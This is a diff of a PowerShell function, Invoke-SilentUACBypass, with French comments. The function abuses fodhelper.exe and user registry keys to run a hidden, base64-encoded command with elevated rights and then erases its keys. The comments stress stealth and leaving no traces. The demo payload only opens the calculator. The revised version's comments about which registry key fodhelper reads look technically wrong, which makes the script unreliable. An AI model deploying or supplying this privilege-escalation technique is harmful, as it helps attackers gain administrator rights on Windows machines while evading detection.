@@ -3,63 +3,53 @@ function Invoke-SilentUACBypass {
     param(
         [Parameter(Mandatory = $false)]
         [string]
-        $Command = "powershell -nop -w hidden -c Start-Process calc"
+        $Command = "powershell -nop -w hidden -c Start-Process calc.exe"
     )
 
-    # Suppression des sorties inutiles
     $ProgressPreference = 'SilentlyContinue'
-    $ErrorActionPreference = 'Stop'  # On gère les erreurs manuellement
+    $ErrorActionPreference = 'Stop'
+
+    # === IMPORTANT : Utiliser un nom fixe que fodhelper.exe va chercher ===
+    $FakeCLSID = "ms-settings-tester"
+    $RegPath = "HKCU:\Software\Classes\$FakeCLSID\Shell\Open\Command"
 
     try {
-        # Génération d'un GUID aléatoire pour le chemin du registre
-        $RandomGuid = [Guid]::NewGuid().ToString().ToUpper()
-        $RegPath = "HKCU:\Software\Classes\ms-settings-$RandomGuid\Shell\Open\Command"
-        
-        # Création discrète des clés de registre
+        # Créer la structure de clés
         New-Item -Path $RegPath -Force | Out-Null
         New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value ([String]::Empty) -PropertyType String -Force | Out-Null
-        
-        # Encodage de la commande PowerShell
+
+        # Préparer la commande encodée
         $Bytes = [Text.Encoding]::Unicode.GetBytes($Command)
         $EncodedCommand = [Convert]::ToBase64String($Bytes)
         $FinalPayload = "powershell -nop -w hidden -enc $EncodedCommand"
-        
-        # Injection de la payload
+
         Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $FinalPayload -Type String -Force | Out-Null
 
-        # Démarrage de fodhelper via une instance cachée
+        # Démarrer fodhelper.exe (il va chercher HKCU\Software\Classes\ms-settings-*)
+        # Le nom "ms-settings-*" est critique
         $ProcessArgs = @{
             FilePath     = "fodhelper.exe"
             WindowStyle  = "Hidden"
             Verb         = "RunAs"
-            PassThru     = $true
             ErrorAction  = "SilentlyContinue"
         }
-        $Process = Start-Process @ProcessArgs
+        Start-Process @ProcessArgs
 
-        # Attente aléatoire avant nettoyage
-        $RandomDelay = Get-Random -Minimum 3 -Maximum 8
-        Start-Sleep -Seconds $RandomDelay
+        # Attendre un peu
+        Start-Sleep -Seconds 2
 
     }
     catch {
-        # Journalisation silencieuse (optionnelle, pour éviter de laisser des traces)
-        # Exemple : écrire dans un fichier chiffré ou ne rien faire
-        # Ne pas laisser de logs visibles
+        # Silencieux
     }
     finally {
-        # Nettoyage avec délai aléatoire
-        $CleanupDelay = Get-Random -Minimum 2 -Maximum 5
-        Start-Sleep -Seconds $CleanupDelay
-        
-        # Suppression récursive des clés
-        $RootKey = "HKCU:\Software\Classes\ms-settings-$RandomGuid"
-        if (Test-Path $RootKey) {
-            Remove-Item -Path $RootKey -Recurse -Force -ErrorAction SilentlyContinue
+        # Nettoyage
+        $KeyPath = "HKCU:\Software\Classes\$FakeCLSID"
+        if (Test-Path $KeyPath) {
+            Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# === Exemple d'utilisation (à des fins éducatives uniquement) ===
-# Attention : Cette commande ouvre la calculatrice.
+# === Appel correct ===
 Invoke-SilentUACBypass -Command "Start-Process calc.exe"
